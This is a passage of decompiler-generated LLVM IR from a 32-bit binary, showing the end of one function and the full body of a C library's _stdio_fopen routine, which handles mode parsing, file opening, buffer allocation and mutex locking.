  %v4_805ae04 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  %v2_805ae09 = load i32, i32* %stack_var_-76, align 4
  store i32 %v2_805ae09, i32* %eax.global-to-local, align 4
  store i32 %v6_805ad0c, i32* %stack_var_-76, align 4
  %v1_805ae0e = call i32 @__libc_close(i32 %v6_805ad0c)
  store i32 %v1_805ae0e, i32* %eax.global-to-local, align 4
  %v0_805ae16 = load i32, i32* @ebx, align 4
  %tmp40 = icmp slt i32 %v0_805ae16, 1
  br i1 %tmp40, label %dec_label_pc_805ae61, label %dec_label_pc_805ae1a

dec_label_pc_805ae1a:                             ; preds = %dec_label_pc_805adfb
  store i32 %v1_805acd5, i32* %eax.global-to-local, align 4
  %v2_805ae1e = add i32 %v1_805acd5, 8
  %v3_805ae1e = inttoptr i32 %v2_805ae1e to i32*
  store i32 %v0_805ae16, i32* %v3_805ae1e, align 4
  %v2_805ae21 = load i32, i32* %stack_var_-60, align 4
  store i32 %v2_805ae21, i32* %edx.global-to-local, align 4
  %v1_805ae24 = load i32, i32* %eax.global-to-local, align 4
  %v2_805ae24 = add i32 %v1_805ae24, 4
  %v3_805ae24 = inttoptr i32 %v2_805ae24 to i32*
  store i32 %v2_805ae21, i32* %v3_805ae24, align 4
  store i8* inttoptr (i32 134583465 to i8*), i8** %stack_var_-72, align 4
  store i32 %v2_805ad5f, i32* %stack_var_-76, align 4
  %v5_805ae33 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134583465, i32 ptrtoint (i32* @global_var_807a66c.724 to i32))
  store i32 %v5_805ae33, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_807a66c.724 to i32), i32* %stack_var_-76, align 4
  %v1_805ae3f = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_807a66c.724 to i32))
  store i32 %v1_805acd5, i32* %edx.global-to-local, align 4
  %v0_805ae48 = load i32, i32* @global_var_807a684.725, align 4
  store i32 %v0_805ae48, i32* %eax.global-to-local, align 4
  %v2_805ae4d = inttoptr i32 %v1_805acd5 to i32*
  store i32 %v0_805ae48, i32* %v2_805ae4d, align 4
  %v0_805ae4f = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_805ae4f, i32* @global_var_807a684.725, align 4
  %v2_805ae55 = load i32, i32* %stack_var_-76, align 4
  store i32 %v2_805ae55, i32* @ecx, align 4
  %v2_805ae56 = load i8*, i8** %stack_var_-72, align 4
  %v3_805ae56 = ptrtoint i8* %v2_805ae56 to i32
  store i32 %v3_805ae56, i32* @ebx, align 4
  store i8* inttoptr (i32 1 to i8*), i8** %stack_var_-72, align 4
  store i32 %v2_805ad5f, i32* %stack_var_-76, align 4
  %v4_805ae5a = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  store i32 %v4_805ae5a, i32* %eax.global-to-local, align 4
  %v2_805ae87.pre.pre = load i32, i32* %stack_var_-60, align 4
  br label %dec_label_pc_805ae84

dec_label_pc_805ae61:                             ; preds = %dec_label_pc_805adfb
  %v3_805ae64 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_805ae64, i32* %stack_var_-76, align 4
  %v1_805ae68 = inttoptr i32 %v3_805ae64 to i16*
  %v2_805ae68 = call i32 @__GI_fclose(i16* %v1_805ae68)
  br label %dec_label_pc_805ae6d

dec_label_pc_805ae6d:                             ; preds = %dec_label_pc_805ad39, %dec_label_pc_805ae61
  %storemerge = phi i32 [ %v2_805ae68, %dec_label_pc_805ae61 ], [ %v1_805ad4a, %dec_label_pc_805ad39 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805ae70

dec_label_pc_805ae70:                             ; preds = %dec_label_pc_805acf0, %dec_label_pc_805ae6d
  store i32 %v1_805acd5, i32* %stack_var_-76, align 4
  %v1_805ae77 = call i32 @free(i32 %v1_805acd5)
  store i32 %v1_805ae77, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-60, align 4
  br label %dec_label_pc_805ae84

dec_label_pc_805ae84:                             ; preds = %dec_label_pc_805ae1a, %dec_label_pc_805ae70
  %v2_805ae87.pre = phi i32 [ %v2_805ae87.pre.pre, %dec_label_pc_805ae1a ], [ 0, %dec_label_pc_805ae70 ]
  br label %dec_label_pc_805ae87

dec_label_pc_805ae87:                             ; preds = %dec_label_pc_805acd0, %dec_label_pc_805acb1, %dec_label_pc_805ae84
  %v2_805ae87 = phi i32 [ 0, %dec_label_pc_805acd0 ], [ 0, %dec_label_pc_805acb1 ], [ %v2_805ae87.pre, %dec_label_pc_805ae84 ]
  store i32 %v2_805ae87, i32* %eax.global-to-local, align 4
  %v2_805ae8d = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805ae8d, i32* @ebx, align 4
  store i32 %v0_805ac96, i32* @esi, align 4
  ret i32 %v2_805ae87

; uselistorder directives
  uselistorder i32 %v2_805ae87, { 1, 0 }
  uselistorder i32 %v0_805ae16, { 1, 0 }
  uselistorder i32 %v2_805adcb, { 1, 2, 0 }
  uselistorder i32 %v1_805ad75, { 1, 0, 2 }
  uselistorder i32 %v6_805ad1d, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v6_805ad0c, { 8, 7, 4, 3, 6, 5, 0, 2, 1 }
  uselistorder i32 %v2_805acf3, { 1, 0, 2 }
  uselistorder i32 %v1_805acd5, { 5, 4, 1, 0, 3, 2, 6, 7 }
  uselistorder i32 %v0_805ad9e, { 2, 1, 0, 5, 3, 4, 6 }
  uselistorder i32* %stack_var_-60, { 1, 2, 0, 3, 4, 5, 6, 7 }
  uselistorder i8** %stack_var_-72, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %stack_var_-76, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32 ptrtoint (i32* @global_var_807a66c.724 to i32), { 3, 6, 2, 4, 7, 0, 5, 8, 1 }
  uselistorder i32 (i32)* @__GI_pipe, { 1, 0 }
  uselistorder i8* %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_805ae87, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805ae84, { 1, 0 }
  uselistorder label %dec_label_pc_805ae70, { 1, 0 }
  uselistorder label %dec_label_pc_805ae6d, { 1, 0 }
  uselistorder label %dec_label_pc_805adbd, { 1, 0 }
  uselistorder label %dec_label_pc_805adb5, { 1, 0 }
  uselistorder label %dec_label_pc_805acd0, { 1, 0 }
}

define i32 @_stdio_fopen(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_805ae90 = load i32, i32* @ebp, align 4
  %v0_805ae91 = load i32, i32* @edi, align 4
  %v0_805ae92 = load i32, i32* @esi, align 4
  %v0_805ae93 = load i32, i32* @ebx, align 4
  store i32 %v0_805ae93, i32* %stack_var_-16, align 4
  %v4_805ae97 = ptrtoint i8* %arg2 to i32
  store i32 %v4_805ae97, i32* %edx.global-to-local, align 4
  store i32 %arg1, i32* @esi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %v2_805aea7 = load i8, i8* %arg2, align 1
  %v3_805aea7 = zext i8 %v2_805aea7 to i32
  %v4_805aea7 = load i32, i32* @eax, align 4
  %v5_805aea7 = and i32 %v4_805aea7, -256
  %v6_805aea7 = or i32 %v5_805aea7, %v3_805aea7
  store i32 %v6_805aea7, i32* %eax.global-to-local, align 4
  %v10_805aea9 = icmp eq i8 %v2_805aea7, 114
  br i1 %v10_805aea9, label %dec_label_pc_805aeeb, label %dec_label_pc_805aead

dec_label_pc_805aead:                             ; preds = %entry
  store i32 577, i32* @ebx, align 4
  %v10_805aeb2 = icmp eq i8 %v2_805aea7, 119
  br i1 %v10_805aeb2, label %dec_label_pc_805aeed, label %dec_label_pc_805aeb6

dec_label_pc_805aeb6:                             ; preds = %dec_label_pc_805aead
  store i32 1089, i32* @ebx, align 4
  %v10_805aeba = icmp eq i8 %v2_805aea7, 97
  br i1 %v10_805aeba, label %dec_label_pc_805aeed, label %dec_label_pc_805aebe

dec_label_pc_805aebe:                             ; preds = %dec_label_pc_805af66, %dec_label_pc_805af40, %dec_label_pc_805aeb6
  %v0_805aebe = load i32, i32* %stack_var_-16, align 4
  %v1_805aebe = call i32 @__errno_location(i32 %v0_805aebe)
  store i32 %v1_805aebe, i32* %eax.global-to-local, align 4
  %v0_805aec3 = load i32, i32* @ebp, align 4
  %v1_805aec3 = icmp eq i32 %v0_805aec3, 0
  %v1_805aec5 = inttoptr i32 %v1_805aebe to i32*
  store i32 22, i32* %v1_805aec5, align 4
  br i1 %v1_805aec3, label %dec_label_pc_805b0b3, label %dec_label_pc_805aed1

dec_label_pc_805aed1:                             ; preds = %dec_label_pc_805af8f, %dec_label_pc_805aebe
  %v0_805aed1 = load i32, i32* @ebp, align 4
  %v1_805aed1 = add i32 %v0_805aed1, 1
  %v2_805aed1 = inttoptr i32 %v1_805aed1 to i8*
  %v3_805aed1 = load i8, i8* %v2_805aed1, align 1
  %v4_805aed1 = and i8 %v3_805aed1, 32
  %v5_805aed1 = icmp eq i8 %v4_805aed1, 0
  br i1 %v5_805aed1, label %dec_label_pc_805b0b3, label %dec_label_pc_805aedb

dec_label_pc_805aedb:                             ; preds = %dec_label_pc_805aed1
  store i32 %v0_805aed1, i32* %stack_var_-76, align 4
  %v1_805aedf = call i32 @free(i32 %v0_805aed1)
  store i32 %v1_805aedf, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_805b0ae

dec_label_pc_805aeeb:                             ; preds = %entry
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_805aeed

dec_label_pc_805aeed:                             ; preds = %dec_label_pc_805aeb6, %dec_label_pc_805aead, %dec_label_pc_805aeeb
  %v0_805aefe = phi i32 [ 1089, %dec_label_pc_805aeb6 ], [ 577, %dec_label_pc_805aead ], [ 1, %dec_label_pc_805aeeb ]
  %v1_805aeed = add i32 %v4_805ae97, 1
  store i32 %v1_805aeed, i32* %eax.global-to-local, align 4
  %v2_805aef0 = inttoptr i32 %v1_805aeed to i8*
  %v3_805aef0 = load i8, i8* %v2_805aef0, align 1
  %v12_805aef0 = icmp eq i8 %v3_805aef0, 98
  br i1 %v12_805aef0, label %dec_label_pc_805aef8, label %dec_label_pc_805aef6

dec_label_pc_805aef6:                             ; preds = %dec_label_pc_805aeed
  store i32 %v4_805ae97, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805aef8

dec_label_pc_805aef8:                             ; preds = %dec_label_pc_805aeed, %dec_label_pc_805aef6
  %v0_805aef8 = phi i32 [ %v1_805aeed, %dec_label_pc_805aeed ], [ %v4_805ae97, %dec_label_pc_805aef6 ]
  %v1_805aef8 = add i32 %v0_805aef8, 1
  %v2_805aef8 = inttoptr i32 %v1_805aef8 to i8*
  %v3_805aef8 = load i8, i8* %v2_805aef8, align 1
  %v12_805aef8 = icmp eq i8 %v3_805aef8, 43
  %v1_805aefc = icmp eq i1 %v12_805aef8, false
  br i1 %v1_805aefc, label %dec_label_pc_805af06, label %dec_label_pc_805aefe

dec_label_pc_805aefe:                             ; preds = %dec_label_pc_805aef8
  store i32 %v0_805aefe, i32* %eax.global-to-local, align 4
  %v1_805af03 = add nuw nsw i32 %v0_805aefe, 1
  store i32 %v1_805af03, i32* @ebx, align 4
  br label %dec_label_pc_805af06

dec_label_pc_805af06:                             ; preds = %dec_label_pc_805aef8, %dec_label_pc_805aefe
  %v1_805af06 = icmp eq i32 %arg3, 0
  %v1_805af08 = icmp eq i1 %v1_805af06, false
  br i1 %v1_805af08, label %dec_label_pc_805af3c, label %dec_label_pc_805af0a

dec_label_pc_805af0a:                             ; preds = %dec_label_pc_805af06
  store i32 80, i32* %stack_var_-76, align 4
  %v1_805af0f = call i32 @malloc(i32 80)
  store i32 %v1_805af0f, i32* %eax.global-to-local, align 4
  store i32 %v1_805af0f, i32* @ebp, align 4
  %v2_805af19 = icmp eq i32 %v1_805af0f, 0
  br i1 %v2_805af19, label %dec_label_pc_805b0b5, label %dec_label_pc_805af21

dec_label_pc_805af21:                             ; preds = %dec_label_pc_805af0a
  %v2_805af0f = inttoptr i32 %v1_805af0f to i16*
  store i16 8192, i16* %v2_805af0f, align 2
  %v2_805af29 = add i32 %v1_805af0f, 8
  %v3_805af29 = inttoptr i32 %v2_805af29 to i32*
  store i32 0, i32* %v3_805af29, align 4
  %v2_805af30 = add i32 %v1_805af0f, 56
  store i32 %v2_805af30, i32* %eax.global-to-local, align 4
  store i32 %v2_805af30, i32* %stack_var_-76, align 4
  %v1_805af34 = call i32 @__stdio_init_mutex(i32 %v2_805af30)
  store i32 %v1_805af34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805af3c

dec_label_pc_805af3c:                             ; preds = %dec_label_pc_805af06, %dec_label_pc_805af21
  %v2_805af3c = icmp slt i32 %arg4, 0
  br i1 %v2_805af3c, label %dec_label_pc_805af89, label %dec_label_pc_805af40

dec_label_pc_805af40:                             ; preds = %dec_label_pc_805af3c
  %v0_805af40 = load i32, i32* @ebx, align 4
  %v0_805af42 = load i32, i32* @esi, align 4
  %v1_805af42 = add i32 %v0_805af42, 1
  store i32 %v1_805af42, i32* %eax.global-to-local, align 4
  %v1_805af45 = and i32 %v0_805af40, 32771
  store i32 %v1_805af45, i32* %edx.global-to-local, align 4
  %v1_805af4b = load i32, i32* @ebp, align 4
  %v2_805af4b = add i32 %v1_805af4b, 4
  %v3_805af4b = inttoptr i32 %v2_805af4b to i32*
  store i32 %arg4, i32* %v3_805af4b, align 4
  %v0_805af4e = load i32, i32* %edx.global-to-local, align 4
  %v1_805af4e = add i32 %v0_805af4e, 1
  store i32 %v1_805af4e, i32* %edx.global-to-local, align 4
  %v0_805af4f = load i32, i32* %eax.global-to-local, align 4
  %v2_805af4f = and i32 %v0_805af4f, %v1_805af4e
  store i32 %v2_805af4f, i32* %eax.global-to-local, align 4
  %v12_805af51 = icmp eq i32 %v2_805af4f, %v1_805af4e
  %v1_805af53 = icmp eq i1 %v12_805af51, false
  br i1 %v1_805af53, label %dec_label_pc_805aebe, label %dec_label_pc_805af59

dec_label_pc_805af59:                             ; preds = %dec_label_pc_805af40
  %v0_805af59 = load i32, i32* @esi, align 4
  %v1_805af5b = and i32 %v0_805af59, 1024
  %v1_805af5d = xor i32 %v1_805af5b, 1024
  store i32 %v1_805af5d, i32* %eax.global-to-local, align 4
  %v1_805af62 = load i32, i32* @ebx, align 4
  %v2_805af62 = and i32 %v1_805af62, %v1_805af5d
  %v3_805af62 = icmp eq i32 %v2_805af62, 0
  br i1 %v3_805af62, label %dec_label_pc_805af59.dec_label_pc_805af7f_crit_edge, label %dec_label_pc_805af66

dec_label_pc_805af59.dec_label_pc_805af7f_crit_edge: ; preds = %dec_label_pc_805af59
  br label %dec_label_pc_805af7f

dec_label_pc_805af66:                             ; preds = %dec_label_pc_805af59
  store i32 4, i32* %stack_var_-72, align 4
  store i32 %arg4, i32* %stack_var_-76, align 4
  %v3_805af6f = call i32 @__libc_fcntl(i32 %arg4, i32 4, i32 1024)
  store i32 %v3_805af6f, i32* %eax.global-to-local, align 4
  %v1_805af77 = icmp eq i32 %v3_805af6f, 0
  %v1_805af79 = icmp eq i1 %v1_805af77, false
  br i1 %v1_805af79, label %dec_label_pc_805aebe, label %dec_label_pc_805af66.dec_label_pc_805af7f_crit_edge

dec_label_pc_805af66.dec_label_pc_805af7f_crit_edge: ; preds = %dec_label_pc_805af66
  %v0_805af7f.pre = load i32, i32* @esi, align 4
  %v0_805af85.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805af7f

dec_label_pc_805af7f:                             ; preds = %dec_label_pc_805af59.dec_label_pc_805af7f_crit_edge, %dec_label_pc_805af66.dec_label_pc_805af7f_crit_edge
  %v0_805af85 = phi i32 [ %v1_805af62, %dec_label_pc_805af59.dec_label_pc_805af7f_crit_edge ], [ %v0_805af85.pre, %dec_label_pc_805af66.dec_label_pc_805af7f_crit_edge ]
  %v0_805af7f = phi i32 [ %v0_805af59, %dec_label_pc_805af59.dec_label_pc_805af7f_crit_edge ], [ %v0_805af7f.pre, %dec_label_pc_805af66.dec_label_pc_805af7f_crit_edge ]
  %v1_805af7f = and i32 %v0_805af7f, 32768
  %v2_805af85 = or i32 %v1_805af7f, %v0_805af85
  store i32 %v2_805af85, i32* @ebx, align 4
  br label %dec_label_pc_805afaa

dec_label_pc_805af89:                             ; preds = %dec_label_pc_805af3c
  %v1_805af89 = add i32 %arg4, 1
  %v8_805af89 = icmp eq i32 %v1_805af89, 0
  store i32 %v1_805af89, i32* @edi, align 4
  %v0_805af95.pre = load i32, i32* @ebx, align 4
  br i1 %v8_805af89, label %dec_label_pc_805af8f, label %dec_label_pc_805af8c

dec_label_pc_805af8c:                             ; preds = %dec_label_pc_805af89
  %v11_805af8c = or i32 %v0_805af95.pre, 32768
  store i32 %v11_805af8c, i32* @ebx, align 4
  br label %dec_label_pc_805af8f

dec_label_pc_805af8f:                             ; preds = %dec_label_pc_805af89, %dec_label_pc_805af8c
  %v0_805af95 = phi i32 [ %v11_805af8c, %dec_label_pc_805af8c ], [ %v0_805af95.pre, %dec_label_pc_805af89 ]
  store i32 %v0_805af95, i32* %stack_var_-72, align 4
  %v0_805af96 = load i32, i32* @esi, align 4
  store i32 %v0_805af96, i32* %stack_var_-76, align 4
  %v3_805af97 = trunc i32 %v0_805af95 to i8
  %v4_805af97 = call i32 @__libc_open(i32 %v0_805af96, i8 %v3_805af97, i32 438)
  store i32 %v4_805af97, i32* %eax.global-to-local, align 4
  %v1_805af9f = load i32, i32* @ebp, align 4
  %v2_805af9f = add i32 %v1_805af9f, 4
  %v3_805af9f = inttoptr i32 %v2_805af9f to i32*
  store i32 %v4_805af97, i32* %v3_805af9f, align 4
  %v2_805afa2 = icmp slt i32 %v4_805af97, 0
  br i1 %v2_805afa2, label %dec_label_pc_805aed1, label %dec_label_pc_805afaa

dec_label_pc_805afaa:                             ; preds = %dec_label_pc_805af8f, %dec_label_pc_805af7f
  %v0_805afaa = load i32, i32* @ebp, align 4
  %v1_805afaa = inttoptr i32 %v0_805afaa to i16*
  %v2_805afaa = load i16, i16* %v1_805afaa, align 2
  %v3_805afaa = and i16 %v2_805afaa, 8192
  store i16 %v3_805afaa, i16* %v1_805afaa, align 2
  %v0_805afb0 = load i32, i32* @ebx, align 4
  %v8_805afb2 = and i32 %v0_805afb0, -31744
  %v1_805afb7 = urem i32 %v0_805afb0, 4
  %v1_805afba = add nuw nsw i32 %v1_805afb7, 1
  store i32 %v1_805afba, i32* %eax.global-to-local, align 4
  %v1_805afbb = load i32, i32* @ebp, align 4
  %v2_805afbb = inttoptr i32 %v1_805afbb to i32*
  %v3_805afbb = load i32, i32* %v2_805afbb, align 4
  %v4_805afbb = or i32 %v3_805afbb, %v8_805afb2
  %v1_805afbe = mul nuw nsw i32 %v1_805afba, 16
  %v2_805afc1 = xor i32 %v1_805afbe, 48
  store i32 %v2_805afc1, i32* %eax.global-to-local, align 4
  %v2_805afc4 = or i32 %v4_805afbb, %v2_805afc1
  store i32 %v2_805afc4, i32* @ebx, align 4
  %v1_805afc6 = trunc i32 %v2_805afc4 to i16
  %v3_805afc6 = inttoptr i32 %v1_805afbb to i16*
  store i16 %v1_805afc6, i16* %v3_805afc6, align 2
  %v0_805afca = load i32, i32* %stack_var_-76, align 4
  %v1_805afca = call i32 @__errno_location(i32 %v0_805afca)
  store i32 %v1_805afca, i32* %eax.global-to-local, align 4
  store i32 %v1_805afca, i32* @esi, align 4
  %v1_805afd4 = inttoptr i32 %v1_805afca to i32*
  %v2_805afd4 = load i32, i32* %v1_805afd4, align 4
  store i32 %v2_805afd4, i32* @edi, align 4
  %v0_805afd6 = load i32, i32* @ebp, align 4
  %v1_805afd6 = add i32 %v0_805afd6, 4
  %v2_805afd6 = inttoptr i32 %v1_805afd6 to i32*
  %v3_805afd6 = load i32, i32* %v2_805afd6, align 4
  store i32 %v3_805afd6, i32* %stack_var_-76, align 4
  %v1_805afd9 = call i32 @isatty(i32 %v3_805afd6)
  %v2_805afe1 = mul i32 %v1_805afd9, 256
  store i32 %v2_805afe1, i32* %eax.global-to-local, align 4
  %v0_805afe4 = load i32, i32* @ebx, align 4
  %v2_805afe4 = or i32 %v0_805afe4, %v2_805afe1
  store i32 %v2_805afe4, i32* @ebx, align 4
  %v1_805afe6 = trunc i32 %v2_805afe4 to i16
  %v2_805afe6 = load i32, i32* @ebp, align 4
  %v3_805afe6 = inttoptr i32 %v2_805afe6 to i16*
  store i16 %v1_805afe6, i16* %v3_805afe6, align 2
  %v0_805afea = load i32, i32* @edi, align 4
  %v1_805afea = load i32, i32* @esi, align 4
  %v2_805afea = inttoptr i32 %v1_805afea to i32*
  store i32 %v0_805afea, i32* %v2_805afea, align 4
  %v0_805afec = load i32, i32* @ebp, align 4
  %v1_805afec = add i32 %v0_805afec, 8
  %v2_805afec = inttoptr i32 %v1_805afec to i32*
  %v3_805afec = load i32, i32* %v2_805afec, align 4
  %v4_805afec = icmp eq i32 %v3_805afec, 0
  %v1_805aff0 = icmp eq i1 %v4_805afec, false
  br i1 %v1_805aff0, label %dec_label_pc_805b020, label %dec_label_pc_805aff2

dec_label_pc_805aff2:                             ; preds = %dec_label_pc_805afaa
  store i32 4096, i32* %stack_var_-76, align 4
  %v1_805affa = call i32 @malloc(i32 4096)
  store i32 %v1_805affa, i32* %eax.global-to-local, align 4
  %v1_805b002 = load i32, i32* @ebp, align 4
  %v2_805b002 = add i32 %v1_805b002, 8
  %v3_805b002 = inttoptr i32 %v2_805b002 to i32*
  store i32 %v1_805affa, i32* %v3_805b002, align 4
  %v1_805b005 = icmp eq i32 %v1_805affa, 0
  %v0_805b019 = load i32, i32* @ebp, align 4
  br i1 %v1_805b005, label %dec_label_pc_805b019, label %dec_label_pc_805b009

dec_label_pc_805b009:                             ; preds = %dec_label_pc_805aff2
  %v1_805b009 = inttoptr i32 %v0_805b019 to i16*
  %v2_805b009 = load i16, i16* %v1_805b009, align 2
  %v3_805b009 = or i16 %v2_805b009, 16384
  store i16 %v3_805b009, i16* %v1_805b009, align 2
  %v1_805b00f = add i32 %v1_805affa, 4096
  store i32 %v1_805b00f, i32* %eax.global-to-local, align 4
  %v1_805b014 = load i32, i32* @ebp, align 4
  %v2_805b014 = add i32 %v1_805b014, 12
  %v3_805b014 = inttoptr i32 %v2_805b014 to i32*
  store i32 %v1_805b00f, i32* %v3_805b014, align 4
  br label %dec_label_pc_805b020

dec_label_pc_805b019:                             ; preds = %dec_label_pc_805aff2
  %v1_805b019 = add i32 %v0_805b019, 12
  %v2_805b019 = inttoptr i32 %v1_805b019 to i32*
  store i32 0, i32* %v2_805b019, align 4
  br label %dec_label_pc_805b020

dec_label_pc_805b020:                             ; preds = %dec_label_pc_805afaa, %dec_label_pc_805b009, %dec_label_pc_805b019
  %v0_805b020 = load i32, i32* @ebp, align 4
  %v1_805b020 = add i32 %v0_805b020, 8
  %v2_805b020 = inttoptr i32 %v1_805b020 to i32*
  %v3_805b020 = load i32, i32* %v2_805b020, align 4
  store i32 %v3_805b020, i32* %eax.global-to-local, align 4
  %v1_805b023 = add i32 %v0_805b020, 2
  %v2_805b023 = inttoptr i32 %v1_805b023 to i8*
  store i8 0, i8* %v2_805b023, align 1
  %v0_805b027 = load i32, i32* %eax.global-to-local, align 4
  %v1_805b027 = load i32, i32* @ebp, align 4
  %v2_805b027 = add i32 %v1_805b027, 24
  %v3_805b027 = inttoptr i32 %v2_805b027 to i32*
  store i32 %v0_805b027, i32* %v3_805b027, align 4
  %v0_805b02a = load i32, i32* %eax.global-to-local, align 4
  %v1_805b02a = load i32, i32* @ebp, align 4
  %v2_805b02a = add i32 %v1_805b02a, 28
  %v3_805b02a = inttoptr i32 %v2_805b02a to i32*
  store i32 %v0_805b02a, i32* %v3_805b02a, align 4
  %v0_805b02d = load i32, i32* %eax.global-to-local, align 4
  %v1_805b02d = load i32, i32* @ebp, align 4
  %v2_805b02d = add i32 %v1_805b02d, 16
  %v3_805b02d = inttoptr i32 %v2_805b02d to i32*
  store i32 %v0_805b02d, i32* %v3_805b02d, align 4
  %v0_805b030 = load i32, i32* %eax.global-to-local, align 4
  %v1_805b030 = load i32, i32* @ebp, align 4
  %v2_805b030 = add i32 %v1_805b030, 20
  %v3_805b030 = inttoptr i32 %v2_805b030 to i32*
  store i32 %v0_805b030, i32* %v3_805b030, align 4
  %v0_805b033 = load i32, i32* @ebp, align 4
  %v1_805b033 = add i32 %v0_805b033, 44
  %v2_805b033 = inttoptr i32 %v1_805b033 to i32*
  store i32 0, i32* %v2_805b033, align 4
  %v0_805b03a = load i32, i32* @ebp, align 4
  %v1_805b03a = add i32 %v0_805b03a, 1
  %v2_805b03a = inttoptr i32 %v1_805b03a to i8*
  %v3_805b03a = load i8, i8* %v2_805b03a, align 1
  %v4_805b03a = and i8 %v3_805b03a, 32
  %v5_805b03a = icmp eq i8 %v4_805b03a, 0
  %v0_805b03e = load i32, i32* @global_var_8073db0.705, align 16
  store i32 %v0_805b03e, i32* %eax.global-to-local, align 4
  %v2_805b043 = add i32 %v0_805b03a, 52
  %v3_805b043 = inttoptr i32 %v2_805b043 to i32*
  store i32 %v0_805b03e, i32* %v3_805b043, align 4
  br i1 %v5_805b03a, label %dec_label_pc_805b0b5, label %dec_label_pc_805b048

dec_label_pc_805b048:                             ; preds = %dec_label_pc_805b020
  store i32 134583465, i32* %stack_var_-72, align 4
  %v2_805b053 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_805b053, i32* @esi, align 4
  store i32 %v2_805b053, i32* %stack_var_-76, align 4
  %v4_805b058 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134583465, i32 ptrtoint (i32* @global_var_8073d98.718 to i32))
  store i32 %v4_805b058, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8073d98.718 to i32), i32* %stack_var_-76, align 4
  %v1_805b064 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8073d98.718 to i32))
  store i32 %v1_805b064, i32* %eax.global-to-local, align 4
  store i32 134583465, i32* %stack_var_-72, align 4
  %v2_805b076 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_805b076, i32* @ebx, align 4
  store i32 %v2_805b076, i32* %stack_var_-76, align 4
  %v4_805b07b = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-48, i32 134583465, i32 ptrtoint (i32* @global_var_8073d80.729 to i32))
  store i32 %v4_805b07b, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8073d80.729 to i32), i32* %stack_var_-76, align 4
  %v1_805b087 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8073d80.729 to i32))
  %v0_805b08c = load i32, i32* bitcast (i32** @global_var_8073d7c.702 to i32*), align 4
  store i32 %v0_805b08c, i32* %eax.global-to-local, align 4
  %v1_805b091 = load i32, i32* @ebp, align 4
  %v2_805b091 = add i32 %v1_805b091, 32
  %v3_805b091 = inttoptr i32 %v2_805b091 to i32*
  store i32 %v0_805b08c, i32* %v3_805b091, align 4
  %v0_805b094 = load i32, i32* @ebp, align 4
  store i32 %v0_805b094, i32* bitcast (i32** @global_var_8073d7c.702 to i32*), align 4
  %v2_805b09a = load i32, i32* %stack_var_-76, align 4
  store i32 %v2_805b09a, i32* @ecx, align 4
  %v2_805b09b = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_805b09b, i32* @edi, align 4
  store i32 1, i32* %stack_var_-72, align 4
  store i32 %v2_805b076, i32* %stack_var_-76, align 4
  %v3_805b09f = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-48, i32 1)
  store i32 %v2_805b076, i32* %eax.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  store i32 1, i32* %stack_var_-72, align 4
  store i32 %v2_805b053, i32* %stack_var_-76, align 4
  %v3_805b0a9 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  store i32 %v3_805b0a9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805b0ae

dec_label_pc_805b0ae:                             ; preds = %dec_label_pc_805aedb, %dec_label_pc_805b048
  br label %dec_label_pc_805b0b5

dec_label_pc_805b0b3:                             ; preds = %dec_label_pc_805aed1, %dec_label_pc_805aebe
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_805b0b5

dec_label_pc_805b0b5:                             ; preds = %dec_label_pc_805b020, %dec_label_pc_805af0a, %dec_label_pc_805b0ae, %dec_label_pc_805b0b3
  %v0_805b0b8 = load i32, i32* @ebp, align 4
  store i32 %v0_805b0b8, i32* %eax.global-to-local, align 4
  %v2_805b0ba = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805b0ba, i32* @ebx, align 4
  store i32 %v0_805ae92, i32* @esi, align 4
  store i32 %v0_805ae91, i32* @edi, align 4
  store i32 %v0_805ae90, i32* @ebp, align 4
  ret i32 %v0_805b0b8

; uselistorder directives
